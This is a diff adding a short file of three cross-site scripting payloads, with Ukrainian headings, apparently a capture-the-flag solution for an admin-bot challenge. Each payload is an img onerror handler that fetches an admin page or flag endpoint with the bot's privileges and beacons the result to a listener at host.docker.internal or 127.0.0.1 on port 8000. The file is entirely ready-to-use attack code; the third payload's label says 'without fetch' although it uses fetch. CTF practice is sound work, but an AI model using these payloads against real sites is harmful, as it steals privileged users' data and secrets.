@@ -1,0 +1,11 @@
+Docker (бот у контейнері -> listener на хості):
+
+<img src=x onerror="fetch('/admin/flag').then(r=>r.json()).then(d=>{new Image().src='http://host.docker.internal:8000/leak?f='+encodeURIComponent(d.flag)})">
+
+Локальний Python-запуск (бот і listener на одній машині):
+
+<img src=x onerror="fetch('/admin/flag').then(r=>r.json()).then(d=>{new Image().src='http://127.0.0.1:8000/leak?f='+encodeURIComponent(d.flag)})">
+
+Альтернатива без fetch (читає флаг просто з адмінки):
+
+<img src=x onerror="fetch('/admin').then(r=>r.text()).then(t=>{new Image().src='http://host.docker.internal:8000/leak?f='+encodeURIComponent(t.match(/CTF\{[^}]+\}/)[0])})">
